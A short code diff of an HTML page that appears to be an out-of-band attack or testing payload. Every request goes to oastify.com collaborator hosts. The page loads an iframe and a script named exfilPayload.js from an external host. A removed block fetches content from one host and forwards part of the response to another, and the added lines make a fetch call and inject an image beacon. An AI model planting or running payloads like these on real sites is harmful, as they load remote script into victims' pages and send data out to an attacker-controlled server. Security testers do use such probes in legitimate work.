@@ -9,22 +9,9 @@
     <iframe src="https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/iframe"></iframe>
       <script src=https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/exfilPayload.js></script>
     <script>
-      const fetchUrl = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/1hello';
-      const sendUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/coco';
-      const options = {
-        mode: 'no-cors'
-      };
-      fetch(fetchUrl, options)
-        .then(response => response.text())
-        .then(body => {
-          const croppedBody = body.slice(0, 100);
-          const requestUrl = `${sendUrl}/${croppedBody}`;
-          fetch(requestUrl, options)
-            .then(response => response.text())
-            .then(result => console.log(result))
-            .catch(error => console.error(error));
-        })
-        .catch(error => console.error(error));
+      const fetchUrl = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/jsfetch'
+      fetch(fetchUrl, {"mode":"no-cors"})
+      document.body.appendChild(document.createElement("img")).src = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/newimage'
     </script>
   </body>
 </html>
